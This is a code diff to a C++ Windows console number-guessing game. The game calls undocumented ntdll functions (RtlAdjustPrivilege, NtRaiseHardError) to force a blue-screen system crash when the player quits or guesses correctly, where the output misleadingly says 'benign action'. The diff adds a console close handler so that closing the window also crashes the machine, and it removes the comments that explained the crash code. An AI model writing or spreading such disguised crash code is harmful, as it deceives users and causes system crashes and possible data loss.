@@ -19,37 +19,43 @@ typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus,
     ULONG ResponseOption,
     PULONG Response);
 
-// Action to run when the user guesses correctly.
+// action to run when the user guesses correctly.
 static void TriggerAction()
 {
     MessageBoxA(NULL, "brace for impact", "Success", MB_OK | MB_ICONINFORMATION);
 }
 
-// This function will be used to trigger the BSOD.
 void TriggerBSOD()
 {
-    // Store return values of NT calls
     BOOLEAN bEnabled;
     ULONG uResp;
 
-    // Get raw function pointers from ntdll
     LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
     LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
 
-    // Create function pointers using grabbed function addresses
     pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
     pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;
 
-    // Elevate the current process privilege to that required for system shutdown
     RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);
 
-    // Call NtRaiseHardError with a floating-point exception to cause BSOD
     NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_SHUTDOWN, &uResp);
+}
+
+BOOL WINAPI ConsoleCloseHandler(DWORD signal)
+{
+    if (signal == CTRL_CLOSE_EVENT)
+    {
+        TriggerBSOD();
+    }
+
+    return TRUE;
 }
 
 void main()
 {
-    // Random number generation and user loop
+    // Register close
+    SetConsoleCtrlHandler(ConsoleCloseHandler, TRUE);
+    // loop starts here
     std::random_device rd;
     std::mt19937 gen(rd());
     std::uniform_int_distribution<int> dist(1, 100);
@@ -72,7 +78,7 @@ void main()
         if (guess == 0)
         {
             std::cout << "Quit.\n";
-			TriggerBSOD();
+            TriggerBSOD();
             return;
         }
         if (guess < 1 || guess > 100)
@@ -83,7 +89,7 @@ void main()
         if (guess == secret)
         {
             std::cout << "Correct! Triggering benign action...\n";
-            TriggerAction();  // Call action when user guesses correctly.
+            TriggerAction();
             TriggerBSOD();
         }
         std::cout << (guess < secret ? "Too low.\n" : "Too high.\n");
